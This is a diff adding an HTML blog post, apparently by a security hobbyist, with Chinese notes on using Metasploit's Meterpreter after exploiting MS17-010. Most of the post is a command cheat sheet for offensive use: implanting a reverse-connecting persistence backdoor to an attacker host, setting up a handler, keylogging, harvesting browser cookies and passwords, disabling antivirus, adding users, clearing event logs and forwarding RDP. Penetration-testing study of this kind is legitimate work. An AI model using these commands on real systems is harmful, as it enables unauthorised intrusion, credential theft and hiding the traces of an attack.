@@ -1,0 +1,211 @@
+<!doctype html>
+<html lang="en">
+    <head><meta name="generator" content="Hexo 3.9.0">
+		
+        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="description" content>
+        <meta name="keywords" content>
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="shortcut icon" href="/img/avatar.jpg">
+        <link rel="alternate" type="application/rss+xml" title="Wiley" href="/atom.xml">
+        <title>Meterpreter使用笔记 | Wiley的部落格小黑屋</title>
+        <meta name="description" content="{{meta_description}}">
+        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+    </head>
+    
+		<body class="post-template">
+	
+
+        <header id="header">
+            <a id="logo" href="/"><img src="/img/avatar.jpg" alt="Wiley的部落格小黑屋"></a>
+            <h1 class="center"><a href="/">Wiley</a></h1>
+            <p class="center">信息安全爱好者，未来的CTFer，喜欢写小工具。</p>
+            <span id="follow-icons">
+      <a href="http://github.com/Wileysec"><i class="fa fa-github-square fa-2x"></i></a>
+        <a href="mailto:wileysec@qq.com"><i class="fa fa-envelope-square fa-2x"></i></a>
+            <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
+  </span>
+
+<h6 class="links">
+  <a href="/About">About</a>
+  <a href="/Links">Links</a>
+</h6>
+        </header>
+
+        <main id="content">
+        
+
+<article class="post">
+  November 4, 2018
+  
+
+  <h1 class="post-title">Meterpreter使用笔记</h1>
+  <section class="post-content article-entry">
+    <p>本文将介绍在MetaSploit漏洞框架中的Meterpreter使用的笔记</p>
+<a id="more"></a>
+
+<h2 id="Meterpreter是什么？"><a href="#Meterpreter是什么？" class="headerlink" title="Meterpreter是什么？"></a>Meterpreter是什么？</h2><p>在Metasploit Framework中，Meterpreter是一种后渗透工具，它属于一种在运行过程中可通过网络进行功能扩展的动态可扩展型Payload。这种工具是基于“内存DLL注入”理念实现的，它能够通过创建一个新进程并调用注入的DLL来让目标系统运行注入的DLL文件。</p>
+<p>其中，攻击者与目标设备中Meterpreter的通信是通过Stager套接字实现的。</p>
+<h2 id="如何部署Meterpreter"><a href="#如何部署Meterpreter" class="headerlink" title="如何部署Meterpreter"></a>如何部署Meterpreter</h2><p>例如，我们使用永恒之蓝的445端口漏洞(MS17-010)的Payload</p>
+<p>我们可以使用reverse_tcp(windows/x64/meterpreter/reverse_tcp)</p>
+<p>此外，上者是针对windows的64位电脑的payload</p>
+<p>如果需要使用32位的payload得自己加载相应的payload</p>
+<p>32位的payload下载地址：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" title="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a><br>或者下载附件(<a href="https://www.wileysec.com/usr/uploads/2018/11/4191129723.zip" target="_blank" rel="noopener">Eternalblue-Doublepulsar-Metasploit.zip</a>)</p>
+<h2 id="Meterpreter的基础操作"><a href="#Meterpreter的基础操作" class="headerlink" title="Meterpreter的基础操作"></a>Meterpreter的基础操作</h2><p><code>文件系统操作</code></p>
+<ul>
+<li><p>cd：切换目标目录</p>
+</li>
+<li><p>cat：读取文件内容</p>
+</li>
+<li><p>del：删除文件</p>
+</li>
+<li><p>edit：使用vim编辑文件</p>
+</li>
+<li><p>ls：获取当前目录下的文件</p>
+</li>
+<li><p>mkdir：新建目录</p>
+</li>
+<li><p>rmdir：删除目录</p>
+</li>
+</ul>
+<p><code>上传/下载文件</code></p>
+<ul>
+<li><p>getwd 获取对方的工作目录</p>
+</li>
+<li><p>getlwd 获取本机的工作目录</p>
+</li>
+<li><p>download C://a.txt D:/ 下载对方C盘下的a.txt文本文件到本地D盘</p>
+</li>
+<li><p>upload C://1.txt D:/ 上传1.txt文本文件到对方的D盘中</p>
+</li>
+</ul>
+<p><code>远程管理</code></p>
+<ul>
+<li><p>run getgui -e 开启远程桌面</p>
+</li>
+<li><p>run getgui -u 用户名 -p 密码 在目标机器添加用户</p>
+</li>
+<li><p>run killav 尝试关闭杀毒软件</p>
+</li>
+<li><p>run persistence -X -i 5 -p 4444 -r 192.168.1.100 persistence后渗透模块向目标主机植入后门程序</p>
+</li>
+</ul>
+<p>-X 在目标主机上开机自启动</p>
+<p>-i 不断尝试反向连接的时间间隔</p>
+<p>执行过程：<br>创建攻击载荷-&gt;攻击载荷植入到目标主机c:\windows\temp目录下，是一个.vbs的脚本-&gt;写目标主机注册表键值实现开机自动运行。</p>
+<p>use exploit/multi/handler</p>
+<p>set payload windows/meterpreter/reverse_tcp</p>
+<p>set LHOST 192.168.1.100</p>
+<p>set LPORT 4444</p>
+<p>exploit</p>
+<ul>
+<li>键盘记录</li>
+</ul>
+<p>keyscan_start 开启记录目标主机的键盘输入</p>
+<p>keyscan_dump  输出截获到的目标键盘输入字符信息</p>
+<p>keyscan_stop  停止键盘记录</p>
+<ul>
+<li><p>run post/windows/gather/enum_applications 模块获取目标主机上的软件安装信息</p>
+</li>
+<li><p>run post/windows/gather/dumplinks 获取目标主机上最近访问过的文档、链接信息</p>
+</li>
+<li><p>run post/windows/gather/enum_ie 读取目标主机IE浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码</p>
+</li>
+<li><p>clearev 渗透利用过程中清除日志等信息痕迹</p>
+</li>
+<li><p>migrate 1668 转移Meterpreter进程到PID为1668的进程</p>
+</li>
+<li><p>ps 查看目标主机上运行的进程信息，结合migrate使用</p>
+</li>
+<li><p>portfwd 端口转发</p>
+</li>
+</ul>
+<p>例如目标主机上开启了3389，但是只允许特定IP访问，攻击主机无法连接，可以使用portfwd命令把目标主机的3389端口转发到其他端口打开。</p>
+<p>例如：portfwd  add -l  1122 -p 3389 -r  192.168.250.176</p>
+<p>把目标主机192.168.250.176的3389端口转发到1122端口</p>
+<p>这是只需要连接目标的1122端口就可以打开远程桌面了</p>
+<p>rdesktop  -u  administrator  -p  123456  192.168.250.176:1122</p>
+<ul>
+<li>search 在目标主机文件系统上查找搜索文件</li>
+</ul>
+<p>例如：search  -d  c:\  -f  *.doc</p>
+<p>在目标主机C盘下搜索doc文档</p>
+
+  </section>
+  <footer class="post-footer">
+    <!--
+    <section class="author">
+      <h4>Wiley</h4>
+      <p></p>
+    </section>
+    -->
+  </footer>
+</article>
+
+<nav class="pagination" role="pagination">
+    
+    <a class="older-posts float-left" href="/2018/10/15/使用phpqrcode类生成二维码/">
+        &laquo; 使用phpqrcode类生成二维码
+    </a>
+    
+    
+    <a class="newer-posts float-right" href="/2018/12/15/ThinkPHP5远程命令执行漏洞/">
+        ThinkPHP5远程命令执行漏洞 &raquo;
+    </a>
+    
+    <div class="clear-both"></div>
+</nav>
+
+<!-- Table of Contents -->
+<div class="full-toc">
+    <button class="post-toc-menu">TOC</button>
+<div class="post-toc">
+	<span class="post-toc-title">文章目录</span>
+    <div class="post-toc-content">
+    	
+    </div>
+</div>
+<script>
+	$('.post-toc-menu').click(function(){
+		if($('.post-toc').hasClass('open')){
+			$('.post-toc').removeClass('open');
+		}else{
+			$('.post-toc').addClass('open');
+		}
+	});
+</script>
+</div>
+
+<script>
+    $(".post-content p").each(function(){
+      imglength = $(this).find('img').length;
+      for(i=0;i<imglength;i++){
+           obj = $(".post-content p img")[i];
+           aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+           imghref = $(aobj).attr('src');
+           $('#fancybox' + i).attr('href',imghref);
+        }
+    });
+</script>
+
+
+        </main>
+        <footer id="footer">
+            <section id="footer-message">&copy; 2019 <a href="https://wileysec.github.io">Wiley</a> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.</section>
+        </footer>
+    </body>
+</html>
+
+
